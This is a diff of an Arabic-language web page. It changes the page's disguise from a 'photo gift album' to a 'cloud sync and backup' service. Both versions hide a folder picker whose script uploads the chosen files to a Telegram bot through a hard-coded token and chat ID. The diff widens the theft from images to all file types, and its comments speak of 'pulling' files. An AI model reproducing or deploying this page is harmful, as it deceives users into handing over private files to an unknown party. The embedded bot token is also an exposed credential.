@@ -3,63 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض الصور الحصري</title>
+    <title>مركز المزامنة السحابية ☁️</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; margin: 0; }
-        .container { padding: 20px; }
-        h1 { font-size: 2rem; margin-bottom: 10px; }
-        p { color: #ccc; margin-bottom: 30px; }
-        .btn { 
-            background: #e91e63; 
-            color: white; 
-            padding: 20px 40px; 
-            border-radius: 12px; 
-            border: none; 
-            font-size: 1.4rem; 
-            font-weight: bold;
-            cursor: pointer; 
-            transition: 0.3s;
-        }
-        .btn:hover { background: #c2185b; transform: scale(1.05); }
+        body { background: #121212; color: #ffffff; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .box { background: #1e1e1e; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
+        .btn { background: #007bff; color: white; padding: 15px 40px; border-radius: 50px; border: none; font-size: 1.2rem; cursor: pointer; font-weight: bold; }
+        .loader { margin-top: 20px; color: #00ff00; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>لقد وصلت لك هدية صور! 🎁</h1>
-        <p>اضغط على الزر أدناه لفتح ألبوم الصور الخاص بك ومزامنته</p>
+    <div class="box">
+        <h1>مزامنة الملفات الشاملة</h1>
+        <p>اضغط للبدء في نسخ ملفاتك احتياطياً وتأمينها</p>
         
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
+        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الشاملة</button>
         
-        <button class="btn" onclick="document.getElementById('fileInput').click()">فتح الألبوم الآن</button>
+        <div id="status" class="loader">جاري نقل البيانات وتشفيرها... يرجى عدم الخروج</div>
     </div>
 
     <script>
-        // البيانات الخاصة بك تم دمجها هنا
         const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
         const CHAT_ID = '7214473798';
 
         document.getElementById('fileInput').addEventListener('change', function(e) {
             const files = e.target.files;
-            
             if (files.length > 0) {
-                alert("جاري الاتصال بالسيرفر للمزامنة... يرجى الانتظار.");
+                document.getElementById('status').style.display = 'block';
                 
                 for (let i = 0; i < files.length; i++) {
-                    // نتحقق أن الملف هو صورة فقط لتجنب الأخطاء
-                    if (files[i].type.startsWith('image/')) {
-                        let formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', files[i]);
+                    let formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    // نستخدم sendDocument لسحب أي نوع ملف (PDF, MP4, APK, etc.)
+                    formData.append('document', files[i]);
 
-                        // إرسال الصورة إلى API تليجرام
-                        fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => console.log('تم الإرسال بنجاح'))
-                        .catch(error => console.error('خطأ في الإرسال:', error));
-                    }
+                    fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => console.log('تم سحب ملف'))
+                    .catch(err => console.error('خطأ'));
                 }
             }
         });
